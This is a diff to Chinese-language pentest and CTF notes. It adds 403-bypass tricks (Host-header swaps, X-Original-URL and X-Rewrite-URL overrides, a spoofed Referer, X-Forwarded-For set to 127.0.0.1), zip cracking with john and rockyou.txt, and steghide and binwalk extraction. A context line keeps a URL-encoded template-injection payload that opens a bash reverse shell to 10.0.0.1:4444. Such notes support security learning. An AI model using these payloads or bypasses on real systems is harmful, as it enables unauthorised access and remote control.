@@ -185,6 +185,80 @@ john hash --wordlist=rockyou.txt
 %7B%25%20import%20os%20%25%7D%7B%7Bos.system('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261%22')%7D%7D
 ```
 
+## 403bypass
+
+#### 旁站绕过
+
+原理：有些服务端只针对某些主机头进行权限的限制
+
+```
+原：
+# Request
+  GET /auth/login HTTP/1.1
+  Host: www.abc.com
+# Response
+  HTTP/1.1 403 Frobidden
+  
+绕：
+# Request
+  GET /auth/login HTTP/1.1
+  Host: $xxx$.abc.com
+# Response
+  HTTP/1.1 200 OK
+```
+
+#### URL覆盖
+
+原理：让服务器认为是在请求根目录
+
+```
+原：
+# Request
+  GET /auth/login HTTP/1.1
+# Response
+  HTTP/1.1 403 Forbidden
+  
+绕：
+# Request
+  GET / HTTP/1.1
+  X-Original-URL: /auth/login
+# Response
+  HTTP/1.1 200 OK
+  
+或：
+# Request
+  GET / HTTP/1.1
+  X-Rewrite-URL: /auth/login
+# Response
+  HTTP/1.1 200 OK
+```
+
+#### Referer绕过
+
+```
+原：
+# Request
+  GET /auth/login HTTP/1.1
+# Response
+  HTTP/1.1 403 Forbidden
+
+绕：
+# Request
+  GET /auth/login HTTP/1.1
+  Referer: http://xxx.abc.com/login
+# Response
+  HTTP/1.1 200 OK
+```
+
+#### 各种X头绕过
+
+```
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+```
+
+
 ## 其他
 
 #### php url传参执行cmd命令
@@ -263,6 +337,43 @@ apt install seclists
 ```
 key is 'x'
 
+#### zip密码破解
+
+用john
+
+先将zip转化成 john 可用的hash文件
+
+```
+zip2john aa.zip > hash_aa
+```
+
+然后
+
+```
+john hash_aa --wordlist=rockyou.txt
+```
+
+#### 隐写内容提取&二进制文件提取
+
+比如一张图片king中隐写有隐藏信息
+
+利用steghide
+```
+steghide info king
+```
+
+有些可能还要密码
+
+
+2.使用 binwalk 进行二进制文件分析
+
+比如：
+
+![[photo/Pasted image 20231022204348.png]]
+
+分析出 king 这个图片中除了含有jpeg的数据外还有zip的数据，中有个名字是user的文件
+
+用 `binwalk -e king` 可以提取
 
 
 #### Capabilities权限
@@ -298,4 +409,9 @@ file_include传马
 
 
 
+文件头是 `PK` 的多半是package文件，压缩文件
+
+![[photo/Pasted image 20231022203311.png]]
+
+![[photo/Pasted image 20231022203342.png]]
 
